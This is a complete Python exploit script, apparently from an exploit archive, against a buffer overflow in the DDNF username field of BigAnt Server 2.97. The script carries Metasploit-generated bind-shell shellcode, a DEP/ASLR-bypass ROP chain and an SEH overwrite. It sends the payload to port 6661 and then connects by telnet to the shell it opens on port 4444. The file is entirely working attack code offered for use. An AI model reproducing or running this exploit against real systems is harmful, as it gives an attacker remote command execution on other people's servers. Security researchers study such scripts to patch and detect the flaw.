#!/usr/bin/python
#Title: BigAnt Server 2.97 DDNF Username Buffer Overflow
#Author: Craig Freyman (@cd1zz) http://pwnag3.com
#Tested on: Windows 7 64 bit (DEP/ASLR Bypass)
#Similar Exploits: 
#http://www.exploit-db.com/exploits/24528/
#http://www.exploit-db.com/exploits/24527/
#http://www.exploit-db.com/exploits/22466/

import socket,os,struct,sys,subprocess,time

if len(sys.argv) < 2:
     print "[-]Usage: %s <target addr> " % sys.argv[0] + "\r"
     sys.exit(0)

host = sys.argv[1]

#msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -b "\x00\x0a\x0d\x20\x25\x27" 
sc = (
"\xd9\xec\xba\x1f\xaf\x04\x2d\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x56\x31\x55\x18\x03\x55\x18\x83\xc5\x1b\x4d\xf1\xd1"
"\xcb\x18\xfa\x29\x0b\x7b\x72\xcc\x3a\xa9\xe0\x84\x6e\x7d"
"\x62\xc8\x82\xf6\x26\xf9\x11\x7a\xef\x0e\x92\x31\xc9\x21"
"\x23\xf4\xd5\xee\xe7\x96\xa9\xec\x3b\x79\x93\x3e\x4e\x78"
"\xd4\x23\xa0\x28\x8d\x28\x12\xdd\xba\x6d\xae\xdc\x6c\xfa"
"\x8e\xa6\x09\x3d\x7a\x1d\x13\x6e\xd2\x2a\x5b\x96\x59\x74"
"\x7c\xa7\x8e\x66\x40\xee\xbb\x5d\x32\xf1\x6d\xac\xbb\xc3"
"\x51\x63\x82\xeb\x5c\x7d\xc2\xcc\xbe\x08\x38\x2f\x43\x0b"
"\xfb\x4d\x9f\x9e\x1e\xf5\x54\x38\xfb\x07\xb9\xdf\x88\x04"
"\x76\xab\xd7\x08\x89\x78\x6c\x34\x02\x7f\xa3\xbc\x50\xa4"
"\x67\xe4\x03\xc5\x3e\x40\xe2\xfa\x21\x2c\x5b\x5f\x29\xdf"
"\x88\xd9\x70\x88\x7d\xd4\x8a\x48\xe9\x6f\xf8\x7a\xb6\xdb"
"\x96\x36\x3f\xc2\x61\x38\x6a\xb2\xfe\xc7\x94\xc3\xd7\x03"
"\xc0\x93\x4f\xa5\x68\x78\x90\x4a\xbd\x2f\xc0\xe4\x6d\x90"
"\xb0\x44\xdd\x78\xdb\x4a\x02\x98\xe4\x80\x35\x9e\x2a\xf0"
"\x16\x49\x4f\x06\x89\xd5\xc6\xe0\xc3\xf5\x8e\xbb\x7b\x34"
"\xf5\x73\x1c\x47\xdf\x2f\xb5\xdf\x57\x26\x01\xdf\x67\x6c"
"\x22\x4c\xcf\xe7\xb0\x9e\xd4\x16\xc7\x8a\x7c\x50\xf0\x5d"
"\xf6\x0c\xb3\xfc\x07\x05\x23\x9c\x9a\xc2\xb3\xeb\x86\x5c"
"\xe4\xbc\x79\x95\x60\x51\x23\x0f\x96\xa8\xb5\x68\x12\x77"
"\x06\x76\x9b\xfa\x32\x5c\x8b\xc2\xbb\xd8\xff\x9a\xed\xb6"
"\xa9\x5c\x44\x79\x03\x37\x3b\xd3\xc3\xce\x77\xe4\x95\xce"
"\x5d\x92\x79\x7e\x08\xe3\x86\x4f\xdc\xe3\xff\xad\x7c\x0b"
"\x2a\x76\x8c\x46\x76\xdf\x05\x0f\xe3\x5d\x48\xb0\xde\xa2"
"\x75\x33\xea\x5a\x82\x2b\x9f\x5f\xce\xeb\x4c\x12\x5f\x9e"
"\x72\x81\x60\x8b")

#rop chain generated with mona.py - www.corelan.be
rop_gadgets = ""
rop_gadgets += struct.pack('<L',0x0f9edaa9)	# POP EDX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0fa021cc)	# ptr to &VirtualProtect() [IAT expsrv.dll]
rop_gadgets += struct.pack('<L',0x0f9ea2a7)	# MOV ECX,DWORD PTR DS:[EDX] # SUB EAX,ECX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0f9e0214)	# PUSH ECX # SUB AL,5F # POP ESI # POP EBP # RETN 0x24 [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x0f9ee3d9)	# POP ECX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x0F9A5001)	# &Writable location 
rop_gadgets += struct.pack('<L',0x0f9f1e7c) # POP EDX # RETN  [expsrv.dll] 
rop_gadgets += struct.pack('<L',0xffffffff) # EDX starting value
for i in range(0,65): rop_gadgets += struct.pack('<L',0x0f9dbb5a)  # INC EDX # RETN ghetto style [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0f9e65b6) # POP EAX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0xfffffdff)	# Value to negate, will become 0x00000201
rop_gadgets += struct.pack('<L',0x0f9f2831) # NEG EAX # RETN [expsrv.dll]  
rop_gadgets += struct.pack('<L',0x0f9c5f4b) # POP EDI # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0FA0C001) # put this in edi so the nex one doesnt die, writable for edi
rop_gadgets += struct.pack('<L',0x0f9e2be0) # PUSH EAX # OR BYTE PTR DS:[EDI+5E],BL # POP EBX # POP EBP # RETN 0x08    ** [expsrv.dll]
rop_gadgets += struct.pack('<L',0x0f9e24f9) # push esp # ret 0x08 |  {PAGE_EXECUTE_READ} [expsrv.dll
rop_gadgets += struct.pack('<L',0x0f9c5f4b)	# POP EDI # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x0f9e5cd2)	# RETN (ROP NOP) [expsrv.dll]
rop_gadgets += struct.pack('<L',0x0f9c8a3e)	# POP EAX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x909006eb)	# nop with a ninja jump
rop_gadgets += struct.pack('<L',0x0f9f30c2)	# PUSHAD # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0f9e5cd2)	# RETN (ROP NOP) [expsrv.dll]

front = "A" * 684
seh = struct.pack('<L',0x0f9eeb8a) # ADD ESP,1004 [expsrv.dll]
back = "C" * 1592
stack_adjust = "\x81\xc4\x24\xfa\xff\xff"
junk = "D" * (4000 - (len(front) + len(seh) + len(back) + len(rop_gadgets) + len(stack_adjust) + len(sc))) 

sploit = front + seh + back + rop_gadgets + stack_adjust + sc + junk
print "[+] Sending pwnag3 to " + str(host)

try :
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,6661))
	s.send(""
	"DDNF 17\n"
	"classid: 100\n"
	"cmdid: 1\n"
	"objid: 1\n"
	"rootid: 3\n"
	"userid: 8\n"
	"username: "+sploit+
	"\r\n\r\n")
	time.sleep(1)
except:
	print "[-] There was a problem"
	sys.exit()

print "[+] Getting your shell. "
time.sleep(3)
subprocess.Popen("telnet "+host+" 4444",shell=True).wait()
print"[*] Done." 
s.close()